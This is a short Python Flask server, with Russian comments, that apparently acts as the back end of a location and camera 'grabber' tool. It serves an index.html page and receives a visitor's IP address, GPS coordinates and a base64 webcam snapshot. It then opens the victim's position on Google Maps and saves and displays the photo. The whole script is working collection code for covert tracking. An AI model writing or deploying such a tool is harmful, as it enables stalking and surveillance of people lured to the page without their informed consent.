from flask import Flask, request, send_from_directory
import base64, os, webbrowser

app = Flask(__name__)

# 🔹 Отдаёт index.html
@app.route("/")
def index():
    return send_from_directory(".", "index.html")

# 🔹 Получает данные от index.html
@app.route("/location", methods=["POST"])
def location():
    data = request.json
    ip = data.get("ip")
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    image_data = data.get("image")

    print(f"\n🌐 IP: {ip}")

    # 🔹 Геолокация
    if lat and lon:
        print(f"📍 Координаты: {lat}, {lon} (±{accuracy} м)")
        webbrowser.open(f"https://www.google.com/maps?q={lat},{lon}")

    # 🔹 Камера
    if image_data:
        try:
            image_bytes = base64.b64decode(image_data.split(",")[1])
            filename = "snapshot.png"
            with open(filename, "wb") as f:
                f.write(image_bytes)
            print(f"📸 Фото сохранено: {filename}")
            webbrowser.open(f"file://{os.path.abspath(filename)}")
        except Exception as e:
            print(f"❌ Ошибка обработки изображения: {e}")

    return {"status": "ok"}

if __name__ == "__main__":
    app.run(port=5050)
